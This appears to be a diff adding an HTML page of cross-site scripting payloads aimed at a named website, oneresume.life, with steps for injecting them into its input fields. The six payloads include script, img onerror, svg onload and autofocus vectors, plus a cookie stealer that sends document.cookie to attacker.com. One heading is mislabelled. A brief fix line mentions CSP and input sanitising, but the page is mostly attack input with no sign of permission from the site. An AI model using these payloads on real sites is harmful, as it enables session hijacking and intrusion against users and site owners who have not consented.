@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test - oneresume.life</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .test-case { 
+            margin: 10px 0; 
+            padding: 10px; 
+            background: #f5f5f5;
+            border-left: 3px solid #4CAF50;
+        }
+        code { background: #e0e0e0; padding: 2px 5px; }
+        .payload { color: #d32f2f; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>XSS Test Payloads for oneresume.life</h1>
+    <p>Try these in any input field on the target site:</p>
+    
+    <div class="test-case">
+        <h3>1. Basic Alert (Proof of Concept)</h3>
+        <code class="payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+        <p>If you see an alert box, XSS is confirmed.</p>
+    </div>
+    
+    <div class="test-case">
+        <h3>2. Cookie Stealer (Impact Demo)</h3>
+        <code class="payload">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code>
+        <p>Would send user's cookies to attacker server.</p>
+    </div>
+    
+    <div class="test-case">
+        <h3>3. Image Tag (Bypass basic filters)</h3>
+        <code class="payload">&lt;img src=x onerror=alert('XSS')&gt;</code>
+        <p>Works even if &lt;script&gt; tags are blocked.</p>
+    </div>
+    
+    <div class="test-case">
+        <h3>4. SVG Payload</h3>
+        <code class="payload">&lt;svg onload=alert('XSS')&gt;</code>
+        <p>Alternative vector for modern browsers.</p>
+    </div>
+    
+    <div class="test-case">
+        <h3>5. Event Handler</h3>
+        <code class="payload">&lt;input onfocus=alert('XSS') autofocus&gt;</code>
+        <p>Triggers when input gets focus.</p>
+    </div>
+    
+    <div class="test-case">
+        <h3>6. Keyboard Event</h3>
+        <code class="payload">&lt;body onload=alert('XSS')&gt;</code>
+        <p>Triggers on page load.</p>
+    </div>
+    
+    <div class="info">
+        <h3>How to Test:</h3>
+        <ol>
+            <li>Find any input field (search, forms, URL parameters)</li>
+            <li>Enter the payload</li>
+            <li>If alert pops up = XSS confirmed</li>
+            <li>Document the vulnerable parameter</li>
+        </ol>
+        <p><strong>Fix:</strong> Add Content-Security-Policy header + sanitize all inputs</p>
+    </div>
+</body>
+</html>
